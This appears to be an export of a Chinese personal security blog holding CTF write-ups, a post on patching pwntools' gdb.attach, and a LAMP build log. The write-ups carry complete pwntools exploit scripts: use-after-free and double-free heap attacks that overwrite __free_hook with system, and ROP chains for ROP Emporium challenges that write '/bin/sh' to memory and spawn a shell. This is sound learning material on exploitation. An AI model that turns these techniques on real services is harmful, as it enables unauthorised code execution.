free","date":"2020-04-25T03:40:09.709Z","updated":"2020-06-27T16:24:30.624Z","comments":true,"path":"2020/04/25/uaf和double free/","link":"","permalink":"http://chumen77.xyz/2020/04/25/uaf和double free/","excerpt":"","text":"uaf和double free前言最近开始打算入门堆，简单记录几道相关的题。 hitcontraining-uaf题目较为简单存在后门函数，利用uaf漏洞攻击即可。 expfrom pwn import * local_file = &#39;./hacknote&#39; local_libc = &#39;/lib/x86_64-linux-gnu/libc.so.6&#39; remote_libc = local_libc # &#39;../libc.so.6&#39; debug = 0 if debug: io = process(local_file) libc = ELF(local_libc) else: io = remote(&#39;node3.buuoj.cn&#39;,27892) libc = ELF(remote_libc) elf = ELF(local_file) libc = elf.libc context.log_level = &#39;debug&#39; context.arch = elf.arch context.terminal = [&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;]#,&#39;neww&#39; s = lambda data :io.send(data) sa = lambda delim,data :io.sendafter(delim, data) sl = lambda data :io.sendline(data) sla = lambda delim,data :io.sendlineafter(delim, data) sea = lambda delim,data :io.sendafter(delim, data) r = lambda numb=4096 :io.recv(numb) ru = lambda delims, drop=True :io.recvuntil(delims, drop) uu32 = lambda data :u32(data.ljust(4, &#39;\\0&#39;)) uu64 = lambda data :u64(data.ljust(8, &#39;\\0&#39;)) info_addr = lambda tag, addr :io.info(tag + &#39;: {:#x}&#39;.format(addr)) itr = lambda :io.interactive() def dbg(): # gdb.attach(proc.pidof(io)[0],gdbscript=&quot;b main&quot;) gdb.attach(io) pause() def add(size,content): sl(&#39;1&#39;) ru(&#39;Note size &#39;) sl(str(size)) ru(&#39;Content :&#39;) sl(str(content)) def dele(index): sl(&#39;2&#39;) sl(str(index)) def show(index): sl(&#39;3&#39;) sl(str(index)) ru(&#39;Your choice :&#39;) add(16,&#39;aaaa&#39;) ru(&#39;Your choice :&#39;) add(16,&#39;bbbb&#39;) ru(&#39;Your choice :&#39;) dele(0) ru(&#39;Your choice :&#39;) dele(1) ru(&#39;Your choice :&#39;) add(8,p32(elf.symbols[&#39;magic&#39;])) ru(&#39;Your choice :&#39;) show(0) itr() ACTF_2019_babyheap题目有system函数，并且也有/bin/sh\\x00 ，当时在构造这个/bin/sh\\x00的字符串指针的时候费了一点劲，结果发现elf有这个字符串。然后就很简单了，控制好参数即可。还是uaf漏洞进行攻击。 expfrom pwn import * local_file = &#39;./ACTF_2019_babyheap&#39; local_libc = &#39;/lib/x86_64-linux-gnu/libc.so.6&#39; remote_libc = local_libc # &#39;../libc.so.6&#39; debug = 1 if debug: io = process(local_file) libc = ELF(local_libc) else: io = remote(&#39;node3.buuoj.cn&#39;,27341) libc = ELF(remote_libc) elf = ELF(local_file) libc = elf.libc context.log_level = &#39;debug&#39; context.arch = elf.arch context.terminal = [&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;]#,&#39;neww&#39; s = lambda data :io.send(data) sa = lambda delim,data :io.sendafter(delim, data) sl = lambda data :io.sendline(data) sla = lambda delim,data :io.sendlineafter(delim, data) sea = lambda delim,data :io.sendafter(delim, data) r = lambda numb=4096 :io.recv(numb) ru = lambda delims, drop=True :io.recvuntil(delims, drop) uu32 = lambda data :u32(data.ljust(4, &#39;\\0&#39;)) uu64 = lambda data :u64(data.ljust(8, &#39;\\0&#39;)) info_addr = lambda tag, addr :io.info(tag + &#39;: {:#x}&#39;.format(addr)) itr = lambda :io.interactive() def dbg(): # gdb.attach(proc.pidof(io)[0],gdbscript=&quot;b main&quot;) gdb.attach(io) pause() def add(size,content): sla(&#39;Your choice: &#39;,&#39;1&#39;) sla(&#39;size: \\n&#39;,str(size)) sa(&#39;content: \\n&#39;,str(content)) def dele(index): sla(&#39;: &#39;,&#39;2&#39;) sla(&#39;index: \\n&#39;,str(index)) def show(index): sla(&#39;: &#39;,&#39;3&#39;) sla(&#39;index: \\n&#39;,str(index)) add(32,&#39;aaaaaaaa&#39;) #0 add(32,&#39;bbbbbbbb&#39;) #1 dele(0) dele(1) binsh = 0x602010 add(16,flat(binsh,elf.plt[&#39;system&#39;])) # dbg() show(0) itr() actf-2019-messageDouble free，迁移到伪造的堆块，注意控制好伪造堆块的size跟fastbin的对应。改__free_hook为system即可。__free_hook的参数正好是堆块的date，较好控制。（buu给的复现环境是18的，有了tcache机制，但是本人还不太熟悉，只是知道不检查size是否对应了，在16上做的，然后就调试改了改脚本，打通了buu的复现环境。下面的exp也是18的。） expfrom pwn import * local_file = &#39;./ACTF_2019_message&#39; # local_libc = &#39;/lib/x86_64-linux-gnu/libc-2.27.so&#39; # remote_libc = local_libc # &#39;../libc.so.6&#39; debug = 1 if debug: io = process(local_file) # libc = ELF(local_libc) else: io = remote(&#39;node3.buuoj.cn&#39;,25390) # libc = ELF(remote_libc) elf = ELF(local_file) libc = elf.libc context.log_level = &#39;debug&#39; context.arch = elf.arch context.terminal = [&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;]#,&#39;neww&#39; s = lambda data :io.send(data) sa = lambda delim,data :io.sendafter(delim, data) sl = lambda data :io.sendline(data) sla = lambda delim,data :io.sendlineafter(delim, data) sea = lambda delim,data :io.sendafter(delim, data) r = lambda numb=4096 :io.recv(numb) ru = lambda delims, drop=True :io.recvuntil(delims, drop) uu32 = lambda data :u32(data.ljust(4, &#39;\\0&#39;)) uu64 = lambda data :u64(data.ljust(8, &#39;\\0&#39;)) info_addr = lambda tag, addr :io.info(tag + &#39;: {:#x}&#39;.format(addr)) itr = lambda :io.interactive() def dbg(): # gdb.attach(proc.pidof(io)[0],gdbscript=&quot;b main&quot;) gdb.attach(io) pause() def add(length,contend) : sla(&#39;choice: &#39;,&#39;1&#39;) sla(&#39;length of message:\\n&#39;,str(length)) sa(&#39;message:\\n&#39;,str(contend)) def free(index): sla(&#39;choice: &#39;,&#39;2&#39;) sla(&#39;to delete:\\n&#39;,str(index)) def edit(index,contend): sla(&#39;choice: &#39;,&#39;3&#39;) sla(&#39;to edit:\\n&#39;,str(index)) sa(&#39;the message:\\n&#39;,str(contend)) def show(index): sla(&#39;choice: &#39;,&#39;4&#39;) sla(&#39;to display:\\n&#39;,str(index)) add(0x30,&#39;a&#39;) #0 add(0x20,&#39;a&#39;) #1 add(0x20,&#39;a&#39;) #2 free(1) free(2) free(1) add(0x20,p64(0x602068)) add(0x20,&#39;aaaaaaaa&#39;) add(0x20,&#39;aaaaaaaa&#39;) contend = p64(elf.got[&#39;puts&#39;])# + p64(0x30) + p64(elf.got[&#39;puts&#39;]) add(0x20,contend) show(0) ru(&#39; message: &#39;) puts = uu64(r(6)) libc_base = puts - libc.symbols[&#39;puts&#39;] free_hook = libc_base + libc.symbols[&#39;__free_hook&#39;] print(&#39;puts&#39; + hex(puts)) print(&#39;libc_base&#39; + hex(libc_base)) system = libc_base + libc.symbols[&#39;system&#39;] contend = p64(free_hook) dbg() edit(6,contend) # dbg() contend = p64(system) edit(0,contend) # dbg() add(0x8,&#39;/bin/sh\\x00&#39;) free(7) itr()","categories":[],"tags":[{"name":"pwn","slug":"pwn","permalink":"http://chumen77.xyz/tags/pwn/"},{"name":"学习记录","slug":"学习记录","permalink":"http://chumen77.xyz/tags/学习记录/"}]},{"title":"pwntools的gdb.attach","slug":"pwntools的gdb.attach","date":"2020-04-20T04:21:15.070Z","updated":"2020-06-27T16:24:20.524Z","comments":true,"path":"2020/04/20/pwntools的gdb.attach/","link":"","permalink":"http://chumen77.xyz/2020/04/20/pwntools的gdb.attach/","excerpt":"","text":"pwntools的gdb.attach前言最近在尝试学着更快的调试exp，很早就了解到这个gdb.attach，但是本人是ssh连上去的，根本用不了。然后尝试tmux这个神器，来实现gdb.attach。成功以后发现一个不好的点，pwntools gdb.attach上的gdb调试中，很多函数是没有符号表的，调试起来反而难度增加。自己手动gdb.attach上去。然后发现谷歌也谷歌不出来，就来折腾源码了。版本号 ：pwntools (4.0.1) 改善因为正常本人都是 chumen77@chumen-77:~$ gdb at pid这样来进行attach。发现用pwntools时候，它进行的命令是这样的，然后思路就来了找到相关源码，改一下就好了。 找关键处/running in new terminal删除2行和修改一行代码（-q 改成 at）即可。 发现已经可以了。","categories":[],"tags":[{"name":"pwn","slug":"pwn","permalink":"http://chumen77.xyz/tags/pwn/"},{"name":"杂项","slug":"杂项","permalink":"http://chumen77.xyz/tags/杂项/"}]},{"title":"Ropemporium 通关记录","slug":"Ropemporium通关记录","date":"2020-04-13T04:32:06.614Z","updated":"2020-04-15T14:13:36.702Z","comments":true,"path":"2020/04/13/Ropemporium通关记录/","link":"","permalink":"http://chumen77.xyz/2020/04/13/Ropemporium通关记录/","excerpt":"","text":"Ropemporium 通关记录ret2win保护和arch Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000)ida分析题目给了提示，32的buf却可以填充50个字节。并且接受用的是fgets，这个函数不用担心空字节。 int ret2win() { printf(&quot;Thank you! Here&#39;s your flag:&quot;); return system(&quot;/bin/cat flag.txt&quot;); } 并且存在漏洞函数。 exp32位from pwn import * context.arch = &#39;i386&#39; io = process(&#39;./ret2win32&#39;) io.recvuntil(&#39;&gt;&#39;) payload = &#39;a&#39; * 44 + p32(0x08048659) io.sendline(payload) io.interactive() 64位from pwn import * context.arch = &#39;amd64&#39; io = process(&#39;./ret2win&#39;) io.recvuntil(&#39;&gt;&#39;) payload = &#39;a&#39; * 40 + p64(0x00000400811) io.sendline(payload) io.interactive() split保护和arch Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000)ida分析int usefulFunction() { return system(&quot;/bin/ls&quot;); } 后门函数变成了这样，但是可以看到有cat flag的字符串。这样只需要控制system的参数即可。 exp32位：from pwn import * context.arch = &#39;i386&#39; io = process(&#39;./split32&#39;) key = 0x0804A030 # /bin/cat flag.txt&#39; io.recvuntil(&#39;&gt;&#39;) offset = 44 payload = &#39;a&#39; * offset + p32(0x08048657) + p32(0x0804A030) raw_input(&#39;-&gt;&#39;) io.sendline(payload) io.interactive() 64位：from pwn import * context.arch = &#39;amd64&#39; io = process(&#39;./split&#39;) io.recvuntil(&#39;&gt;&#39;) key = 0x00601060 # /bin/cat flag.txt&#39; offset = 40 pop_rdi_ret = 0x0000000000400883 payload = &#39;a&#39; * offset + p64(pop_rdi_ret) + p64(key) + p64(0x00000400810) io.sendline(payload) io.interactive() callmeida分析void __noreturn usefulFunction() { callme_three(4LL, 5LL, 6LL); callme_two(4LL, 5LL, 6LL); callme_one(4LL, 5LL, 6LL); exit(1); } 这个是关键函数，但是其是用到了给的so文件，然后ida来分析so文件。 找到以后发现应该是按照顺序调用callme-one，callme-two，callme-three需要注意其参数都要是1，2，3.当初程序中给的是4，5，6 需要想办法来换掉这个参数。 exp32位：from pwn import * context.arch = &#39;i386&#39; io = process(&#39;./callme32&#39;) io.recvuntil(&#39;&gt;&#39;) offset = 44 callme_one = 0x080485C0 callme_two = 0x08048620 callme_three = 0x080485B0 pop3_ret = 0x080488a9 payload = &#39;a&#39; * offset + p32(callme_one) + p32(pop3_ret) + p32(1) + p32(2) + p32(3) payload += p32(callme_two) + p32(pop3_ret) + p32(1) + p32(2) + p32(3) payload += p32(callme_three) + p32(0xdeadbeef) + p32(1) + p32(2) + p32(3) raw_input(&#39;-&gt;&#39;) io.sendline(payload) io.interactive() 其中pop3_ret 是用来保持栈平衡的，且站的位置函数的返回地址。还有需要注意的问题是：注意填充以后的返回地址填的时候，通常填的是代码段的数据，但是这里汇编是call所以在填的时候，应该是填充其plt的地址。 64位：from pwn import * context.arch = &#39;amd64&#39; io = process(&#39;./callme&#39;) io.recvuntil(&#39;&gt;&#39;) offset = 40 callme_one = 0x00401850 callme_two = 0x000401870 callme_three = 0x00401810 pop3_ret = 0x0000000000401ab0 payload = &#39;a&#39; * offset + p64(pop3_ret) + p64(1) + p64(2) + p64(3) + p64(callme_one) payload += p64(pop3_ret) + p64(1) + p64(2) + p64(3) + p64(callme_two) payload += p64(pop3_ret) + p64(1) + p64(2) + p64(3) + p64(callme_three) raw_input(&#39;-&gt;&#39;) io.sendline(payload) io.interactive() 利用 0x0000000000401ab0 : pop rdi ; pop rsi ; pop rdx ; ret这个gadget来控制参数。 write4ida分析这个题跟前面第2题很像，但是就是没有给你cat flag 的字符串了。需要自己用程序的gadget来构造。思路也就是进行rop把/bin/sh往bss段上写,然后接着拿shell就好了。 ROPgadget --binary ./write4 --only &quot;mov|pop|ret&quot;查好用的gadgets：利用这即可就可以了，32位的类似。 exp32位：from pwn import * context.arch = &#39;i386&#39; io = process(&#39;./write432&#39;) io.recvuntil(&#39;&gt;&#39;) elf = ELF(&#39;./write432&#39;) # bin_sh = elf.search(&#39;/bin/cat&#39;).next() offset = 44 bss = 0x804A06C-0x10 pop_edi_pop_ebp_ret = 0x080486da system = 0x8048430 key = 0x08048670 #mov dword ptr [edi], ebp ; ret payload = &#39;a&#39; * offset + flat([pop_edi_pop_ebp_ret,bss,&#39;sh\\x00\\x00&#39;,key,system,0xdeadbeef,bss]) raw_input(&#39;-&gt;&#39;) io.sendline(payload) io.interactive() 64位：from pwn import * context.arch = &#39;amd64&#39; io = process(&#39;./write4&#39;) io.recvuntil(&#39;&gt;&#39;) elf = ELF(&#39;./write4&#39;) # bin_sh = elf.search(&#39;/bin/cat&#39;).next() offset = 40 bss = 0x601090-0x10 key1 = 0x0000000000400820# mov qword ptr [r14], r15 ; ret key2 = 0x0000000000400890# pop r14 ; pop r15 ; ret key3 = 0x0000000000400893#pop rdi ; ret system = 0x000004005E0 payload = &#39;a&#39; * offset + flat([key2,bss,&#39;/bin/sh\\x00&#39;,key1,key3,bss,system]) raw_input(&#39;-&gt;&#39;) io.sendline(payload) io.interactive() badcharsida分析这个题目跟前一个write4十分的相似，但是其过滤了个别字符：会将其替换为0xEB，个人解决办法就是在bss段写好被程序处理过的字符串后，在用xor的gadgets来重新改回来，为了便于利用，32位和64位都是构造system(sh)来拿的shell。例子：传过去的是sh\\x00\\x00\\x00\\x00\\x00\\x00\\x00 到bss是这个情况，然后去找xor的gadget：其中注意这是以一个byte来进行xor的，然后这个图xor的倒数第一条语句，**其中的是dh，这个是edx的高位。r14b是r14的低位也是一个byte的字节单位。这个题目在gdb调试exp时会发现有比较便捷的办法。 exp32位：from pwn import * context.arch = &#39;i386&#39; io = process(&#39;./badchars32&#39;) io.recvuntil(&#39;&gt;&#39;) elf = ELF(&#39;./badchars32&#39;) key1 = 0x08048893# mov dword ptr [edi], esi ; ret key2 = 0x08048899# pop esi ; pop edi ; ret key3 = 0x08048461# pop ebx ; ret bss = 0x804A06C-10 key4 = 0x08048897# pop ecx ; ret key5 = 0x08048890#xor byte ptr [ebx], cl ; ret sys = 0x080484E0 offset = 44 payload = &#39;a&#39; * offset + flat([key2,&#39;sh\\x00\\x00&#39;,bss,key1,key3,bss,key4,0x98,key5,sys,0xdeadbeef,bss]) raw_input(&quot;-&gt;&quot;) io.sendline(payload) io.interactive() 64位：from pwn import * context.arch = &#39;amd64&#39; io = process(&#39;./badchars&#39;) io.recvuntil(&#39;&gt;&#39;) elf = ELF(&#39;./badchars&#39;) offset = 40 bss = 0x6010B0 key1 = 0x0000000000400b34# mov qword ptr [r13], r12 ; ret key2 = 0x0000000000400b3b# pop r12 ; pop r13 ; ret key3 = 0x0000000000400b39#pop rdi ; ret key4 = 0x0000000000400b30#xor byte ptr [r15], r14b ; ret key5 = 0x0000000000400b40#pop r14 ; pop r15 ; ret system = 0x004006F0 payload = &#39;a&#39; * offset + flat([key2,&#39;sh\\x00\\x00\\x00\\x00\\x00\\x00&#39;,bss,key1,key5,0x98,bss,key4,key3,bss,system]) raw_input(&#39;-&gt;&#39;) io.sendline(payload) io.interactive() fluff这个题目还是跟write4很相似，但是找可用的gadget是，比较难找。需要想尽办法找各种gadget，然后叠加在一起成为需要的链。这个题突破口也就在： mov dword ptr [ecx], edx ; pop ebp ; pop ebx ; xor byte ptr [ecx], bl ; ret然后再去找ecx，edx相关的gadget，里面用到了xor和xchg等相关的gadget。其中64位的找可用gadget，还需要控制一下深度： ROPgadget --binary ./fluff --depth 15 这样找出足够的gadget，以便自己试用。 exp32位：from pwn import * context.arch = &#39;i386&#39; io = process(&#39;./fluff32&#39;) io.recvuntil(&#39;&gt;&#39;) elf = ELF(&#39;./fluff32&#39;) key1 = 0x080483e1# pop ebx ; ret key2 = 0x08048671# xor edx, edx ; pop esi ; mov ebp, 0xcafebabe ; ret key3 = 0x0804867b# xor edx, ebx ; pop ebp ; mov edi, 0xdeadbabe ; ret bss = 0x804A06C key4 = 0x08048689#xchg edx, ecx ; pop ebp ; mov edx, 0xdefaced0 ; ret key5 = 0x08048693# mov dword ptr [ecx], edx ; pop ebp ; pop ebx ; xor byte ptr [ecx], bl ; ret sys = 0x8048430 offset = 44 payload = &#39;a&#39; * offset + flat([key1,bss,key2,1,key3,1,key4,1,key1,&#39;sh\\x00\\x00&#39;,key2,1,key3,1,key5,1,0,sys,0xdeadbeef,bss]) raw_input(&quot;-&gt;&quot;) io.sendline(payload) io.interactive() 64位：from pwn import * context.arch = &#39;amd64&#39; io = process(&#39;./fluff&#39;) io.recvuntil(&#39;&gt;&#39;) elf = ELF(&#39;./fluff&#39;) key1 = 0x0000000000400832# pop r12 ; mov r13d, 0x604060 ; ret key2 = 0x0000000000400822#xor r11, r11 ; pop r14 ; mov edi, 0x601050 ; ret key3 = 0x000000000040082f#xor r11, r12 ; pop r12 ; mov r13d, 0x604060 ; ret bss = 0x601090 key4 = 0x0000000000400840## : xchg r11, r10 ; pop r15 ; mov r11d, 0x602050 ; ret key5 = 0x000000000040084e# mov qword ptr [r10], r11 ; pop r13 ; pop r12 ; xor byte ptr [r10], r12b ; ret key6 = 0x00000000004008c3# pop rdi ; ret sys = 0x4005E0 offset = 40 payload = &#39;a&#39; * offset + flat([key1,bss,key2,1,key3,1,key4,1,key1,&#39;/bin/sh\\x00&#39;,key2,1,key3,1,key5,1,0,key6,bss,sys]) raw_input(&quot;-&gt;&quot;) io.sendline(payload) io.interactive() pivot这个题一看就是栈转移了。 ida分析可以看到会给你泄漏一个堆地址，给你去栈转移。接着看后门函数，发现这里call一个与libc连接的函数： 接着分析一下给定的so文件： void __noreturn ret2win() { system(&quot;/bin/cat flag.txt&quot;); exit(0); } 接着就有思路了，栈转移到给你的堆地址上，然后构造rop链： leak foothold_function_got 算出给的libc基址，回到start，再次利用漏洞 构造jmp到ret2win的链即可但是这个题目还是有技巧的，发现给你的堆地址其实跟这个libc的内存映射是很近的，并且每次差距也是固定的。那就可以直接分析so文件，来算取偏移，直接利用。 根据给的堆地址和so文件映射基址： exp132位：from pwn import * context.arch = &#39;i386&#39; context.log_level = &#39;debug&#39; io = process(&#39;./pivot32&#39;) elf = ELF(&#39;./pivot32&#39;) libc = ELF(&#39;./libpivot32.so&#39;) foothold_function_plt = elf.plt[&#39;foothold_function&#39;] foothold_function_got = elf.got[&#39;foothold_function&#39;] put_plt = elf.plt[&#39;puts&#39;] key1 = 0x080486a8 #: leave ; ret io.recvuntil(&#39;0x&#39;) leak = int(io.recv(8),16) print(&#39;leak_stack&#39;+ hex(leak)) io.recvuntil(&#39;now and it will land there&#39;) io.recvuntil(&#39;&gt;&#39;) payload = flat([0xdeadbeef,foothold_function_plt,put_plt,0x08048640,foothold_function_got]) raw_input(&#39;-&gt;&#39;) io.sendline(payload) io.recvuntil(&#39;stack smash&#39;) io.recvuntil(&#39;&gt;&#39;) payload = 40 * &#39;a&#39; + p32(leak) +p32(key1) io.sendline(payload) io.recvuntil(&#39;foothold_function(), check out my .got.plt entry to gain a foothold into libpivot.so&#39;) leak = u32(io.recv(4)) print(&#39;leak&#39;+ hex(leak)) ret2win = leak - libc.symbols[&#39;foothold_function&#39;] + libc.symbols[&#39;ret2win&#39;] io.recvuntil(&#39;now and it will land there&#39;) io.recvuntil(&#39;&gt;&#39;) io.sendline(&#39;1&#39;) io.recvuntil(&#39;send your stack smash&#39;) payload = &#39;a&#39; * 44 + p32(ret2win) io.sendline(payload) io.interactive() 64位：from pwn import * context.arch = &#39;amd64&#39; context.log_level = &#39;debug&#39; io = process(&#39;./pivot&#39;) elf = ELF(&#39;./pivot&#39;) libc = ELF(&#39;./libpivot.so&#39;) foothold_function_plt = elf.plt[&#39;foothold_function&#39;] foothold_function_got = elf.got[&#39;foothold_function&#39;] offset = libc.symbols[&#39;foothold_function&#39;] - libc.symbols[&#39;ret2win&#39;] put_plt = elf.plt[&#39;puts&#39;] key1 = 0x0000000000400a39 #: leave ; ret key2 = 0x0000000000400b73#pop rdi ; ret key3 = 0x0000000000400b02#xchg rax, rsp ; ret key4 = 0x0000000000400b00#pop rax ; ret print(&#39;offset:&#39; + hex(offset)) io.recvuntil(&#39;0x&#39;) leak = int(io.recv(12),16) print(&#39;leak_stack&#39;+ hex(leak)) io.recvuntil(&#39;now and it will land there&#39;) io.recvuntil(&#39;&gt;&#39;) payload = flat([foothold_function_plt,key2,foothold_function_got,put_plt,0x004008A0]) raw_input(&#39;-&gt;&#39;) io.sendline(payload) io.recvuntil(&#39;stack smash&#39;) io.recvuntil(&#39;&gt;&#39;) payload = 40 * &#39;a&#39; + p64(key4)+ p64(leak) + p64(key3) io.sendline(payload) io.recvuntil(&#39;foothold_function(), check out my .got.plt entry to gain a foothold into libpivot.so&#39;) leak = int(u64(io.recv(6).ljust(8,&#39;\\x00&#39;))) print(&#39;leak&#39;+ hex(leak)) ret2win = leak - libc.symbols[&#39;foothold_function&#39;] + libc.symbols[&#39;ret2win&#39;] print(&#39;ret2win&#39;+ hex(ret2win)) # raw_input(&#39;-&gt;&#39;) io.recvuntil(&#39;&gt;&#39;) payload = &#39;a&#39; * 40 + p64(ret2win) io.sendline(payload) io.interactive() 这个地方因为是fgets函数来获取字符串，其遇到换行就会结束，但是在找gadgat 的时候发现leave ret的这个gadget，地址都是有0x0a,所以只能更换gadget，来伪造栈。 exp232位：from pwn import * context.arch = &#39;i386&#39; context.log_level = &#39;debug&#39; io = process(&#39;./pivot32&#39;) elf = ELF(&#39;./pivot32&#39;) offset = 44 io.recvuntil(&#39;0x&#39;) leak1 = int(io.recv(8),16) + 1921272 + 0x000000967 print(&#39;leak&#39;+ hex(leak1)) raw_input(&#39;-&gt;&#39;) payload = offset * &#39;a&#39; + p32(leak1) io.sendline(&#39;1&#39;) io.recvuntil(&#39;send your stack smash&#39;) io.sendline(payload) io.interactive() 64位：from pwn import * context.arch = &#39;amd64&#39; context.log_level = &#39;debug&#39; io = process(&#39;./pivot&#39;) elf = ELF(&#39;./pivot&#39;) libc = ELF(&#39;./libpivot.so&#39;) offset = 40 io.recvuntil(&#39;0x&#39;) leak1 = int(io.recv(12),16) + 3977456 + libc.symbols[&#39;ret2win&#39;] raw_input(&#39;-&gt;&#39;) payload = offset * &#39;a&#39; + p64(leak1) io.sendline(&#39;1&#39;) io.recvuntil(&#39;send your stack smash&#39;) io.sendline(payload) io.interactive() ret2csu这个题目就是再考ret2csu（64位的万能gadget），让你控制rdx（第三个参数的寄存器）为0xdeadcafebabebeef 就可以了。但是比较难搞的一点是：在这个地方是call，所以这里应该填一个got的地址。不能是一个地址或者plt。因为call 0xaaaaa 汇编作用： push PC（也就是该汇编指令的下一个汇编指令的地址） jmp [0xaaaaa] 是该函数point指向的地址 这个题目在call完每一个函数自带的正常库函数后，都将其got表清0。但是会发现上面还有一个动态链接_DYNAMIC的信息，跟进去：发现一堆初始化用的函数。然后点进去第一个可以看看：发现这里也没有对rdx进行处理，可以使用这个。现在就是确定一下哪里存放着0x400560，毫无疑问肯定是这个_DYNAMIC里，但是自己目前还不熟悉这个结构，看起来貌似是个结构体。先gdb跟入查看吧：发现应该是0x0600E38。接下来的就简单了，传统的ret2csu。 expfrom pwn import * context.arch = &#39;amd64&#39; context.log_level = &#39;debug&#39; io = process(&#39;./ret2csu&#39;) elf = ELF(&#39;./ret2csu&#39;) offset = 40 io.recvuntil(&#39;&gt;&#39;) key1 = 0x040089A key2 = 0x000400880 key3 = 0x0000600E38 raw_input(&#39;-&gt;&#39;) payload = offset * &#39;a&#39; + flat([key1,0,1,key3,0,0,0xdeadcafebabebeef,key2,7*8*&#39;a&#39;,0x000004007B1]) io.sendline(payload) io.interactive()","categories":[],"tags":[{"name":"pwn","slug":"pwn","permalink":"http://chumen77.xyz/tags/pwn/"},{"name":"wp","slug":"wp","permalink":"http://chumen77.xyz/tags/wp/"}]},{"title":"linux- Lamp搭建记录","slug":"linux_ Lamp搭建记录","date":"2020-04-08T06:24:44.064Z","updated":"2020-04-15T14:16:28.952Z","comments":true,"path":"2020/04/08/linux_ Lamp搭建记录/","link":"","permalink":"http://chumen77.xyz/2020/04/08/linux_ Lamp搭建记录/","excerpt":"","text":"Lamp搭建记录准备工作安装编译环境：yum -y install gcc*安装好后记得关闭防火墙和selinux 准备软件包把这些安装包都放入虚拟机自定义的路径，等待使用。 shell脚本批量解包#!/bin/bash /bin/ls *tar.gz &gt; ls.list /bin/ls *tgz &gt;&gt; ls.list for a in `cat ls.list` do /bin/tar -zxf $a done rm -rf ls.list 然后开始一一的装包，注意需要按照一定的顺序来装的。 python-develyum -y install python-devel 安装python的底层环境。 [root@localhost lamp1]# cd libxml2-2.9.1/ [root@localhost libxml2-2.9.1]# ./configure --prefix=/usr/local/libxml2/ [root@localhost libxml2-2.9.1]# make [root@localhost libxml2-2.9.1]# make install libmcrypt提供一些加密算法： [root@localhost lamp1]# cd libmcrypt-2.5.8/ [root@localhost libmcrypt-2.5.8]# ./configure --prefix=/usr/local/libmcrypt/ [root@localhost libmcrypt-2.5.8]# make [root@localhost libmcrypt-2.5.8]# make install libltdl[root@localhost lamp1]# cd libmcrypt-2.5.8/libltdl/ [root@localhost libltdl]# ./configure --enable-ltdl-install [root@localhost libltdl]# make [root@localhost libltdl]# make install mhash提供加密方式的扩展 [root@localhost lamp1]# cd mhash-0.9.9.9/ [root@localhost mhash-0.9.9.9]# ./configure mcrypt提供php相关的加密支持拓展库 [root@localhost mcrypt-2.6.8]# LD_LIBRARY_PATH=/usr/local/libmcrypt/lib:/usr/local/lib \\./configure --with-libmcrypt-prefix=/usr/local/libmcrypt [root@localhost mcrypt-2.6.8]# make [root@localhost mcrypt-2.6.8]# make install zlib提供压缩用途的函数库 [roott@localhost lamp1]# cd zlib-1.2.3/ [root@localhost zlib-1.2.3]# ./configure [root@localhost zlib-1.2.3]# make [root@localhost zlib-1.2.3]# make install libpng[root@localhost zlib-1.2.3]# cd ../ [root@localhost lamp1]# cd libpng-1.2.31/ [root@localhost libpng-1.2.31]# ./configure --prefix=/usr/local/libpng [root@localhost libpng-1.2.31]# make [root@localhost libpng-1.2.31]# make install 如果出现： /usr/bin/ld: //usr/local/lib/libz.a(crc32.o): relocation R_X86_64_32 against `.rodata&#39; can not be used when making a shared object; recompile with -fPIC 解决办法 ： [root@localhost lamp1]# cd zlib-1.2.3 //进入zlib目录 [root@localhost zlib-1.2.3]# ./configure [root@localhost zlib-1.2.3]# CFLAGS=&quot;-O3 -fPIC&quot; ./configure --prefix=/usr/local/zlib/ #使用64位元的方法进行编译 [root@localhost zlib-1.2.3]# make [root@localhost zlib-1.2.3]# make install [root@localhost zlib-1.2.3]# make clean 然后在重新来安装libpng即可。 jpeg6提供jpeg格式的图片 [root@localhost libpng-1.2.31]# mkdir /usr/local/jpeg6 [root@localhost libpng-1.2.31]# mkdir /usr/local/jpeg6/bin [root@localhost libpng-1.2.31]# mkdir /usr/local/jpeg6/lib [root@localhost libpng-1.2.31]# mkdir /usr/local/jpeg6/include [root@localhost libpng-1.2.31]# mkdir -p /usr/local/jpeg6/man/man1 root@localhost lamp]# cd jpeg-6b/ [root@localhost jpeg-6b]# ./configure --prefix=/usr/local/jpeg6/ --enable-shared --enable-static 如果发生这样的报错： [root@localhost jpeg-6b]# make ./libtool --mode=compile gcc -O2 -I. -c ./jcapimin.c make: ./libtool：命令未找到 make: *** [jcapimin.lo] 错误 127 需要： [root@localhost jpeg-6b]# yum -y install libtool [root@localhost jpeg-6b]# cp /usr/share/libtool/config/config.guess . cp：是否覆盖&quot;./config.guess&quot;？ yes [root@localhost jpeg-6b]# make clean 重新再来就好。 freetype字体库。 [root@localhost freetype-2.3.5]# ./configure --prefix=/usr/local/freetype GD给php提供图形拓展的库 [root@localhost lamp]# mkdir /usr/local/gd2 [root@localhost lamp]# cd /usr/src/lamp/gd-2.0.35/ [root@localhost gd-2.0.35]# ./configure --prefix=/usr/local/gd2/ --with-jpeg=/usr/local/jpeg6/ --with-freetype=/usr/local/freetype/ --with-png=/usr/local/libpng/ 这样会爆一个错，然后需要改一下源码： [root@localhost gd-2.0.35]# vim gd_png.c 需要指定一下路径即可，这个刚刚是已经安装过的。 httped先装两个工具包： cp -r apr-1.4.6 httpd-2.4.7/srclib/apr cp -r apr-util-1.4.1 httpd-2.4.7/srclib/apr-util开始装httped：先进入装一下pcre： ./configure make make install进入httped：先对配置进行设置： ./configure --prefix=/usr/local/apache2/ --sysconfdir=/usr/local/apache2/etc --with-include-apr --enable-so --enable-deflate=shared --enable-expires=shared --enable-rewrite=shared make make install开服务：/usr/local/apache2/bin/apachectl start 自启动[root@localhost httpd-2.4.7]# vim /etc/rc.d/rc.local 设置开机时自动启动这个服务。 mysql准备工作装两个工具： [root@localhost local]# yum -y install cmake [root@localhost local]# yum -y install bison [root@localhost local]# yum -y install ncurses-devel建立一个用户： [root@localhost local]# useradd mysql [root@localhost local]# id mysql uid=1001(mysql) gid=1001(mysql) 组=1001(mysql)安装ncurses： [root@localhost ncurses-5.9]# ./configure --with-shared --without-debug --with-ada --enable-overwrite [root@localhost ncurses-5.9]# make [root@localhost ncurses-5.9]# make install 开始安装 [root@localhost mysql-5.5.23]# 